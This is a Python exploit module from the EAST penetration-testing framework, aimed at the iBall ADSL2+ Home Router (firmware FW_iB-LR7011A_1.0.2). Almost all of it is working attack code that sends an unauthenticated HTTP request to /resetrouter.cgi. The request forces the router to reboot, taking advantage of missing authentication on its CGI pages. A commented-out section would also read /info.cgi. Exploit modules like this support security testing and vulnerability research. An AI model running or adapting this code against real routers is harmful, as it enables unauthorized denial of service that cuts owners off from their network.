#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import urllib2
import time

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_iball_adsl2_router_rr"
INFO['DESCRIPTION'] = "iBall ADSL2+ Home Router - Reset Router"
INFO['VENDOR'] = "https://www.iball.co.in"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['http://0day.today/exploit/28572']
INFO["CVE Name"] = ""
INFO["NOTES"] = """
iBall ADSL2+ Home Router does not properly authenticate when pages are accessed through cgi version. Firmware version: FW_iB-LR7011A_1.0.2
"""

INFO['CHANGELOG'] = "20 Sep, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Hardware/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS['HOST'] = '127.0.0.1', dict(description = 'Target IP')
OPTIONS["PORT"] = 80

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.port = int(self.args.get('PORT', self.port))
        self.host = self.args.get('HOST', self.host)
        
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format(self.host, self.port, path)
        
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        #url = self.make_url('/info.cgi')
        #try:
        #    fd = urllib2.urlopen(url)
        #    self.log(fd.read())
        #except Exception as e:
        #    self.log(e)
        #    self.finish(False)
        
        url = self.make_url('/resetrouter.cgi')
        request = urllib2.Request(url)
        try:
            fd = urllib2.urlopen(request)
            result = fd.read()
        except Exception as e:
            self.log(e)
            self.finish(False)
        self.log('The DSL Router is rebooting.')
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
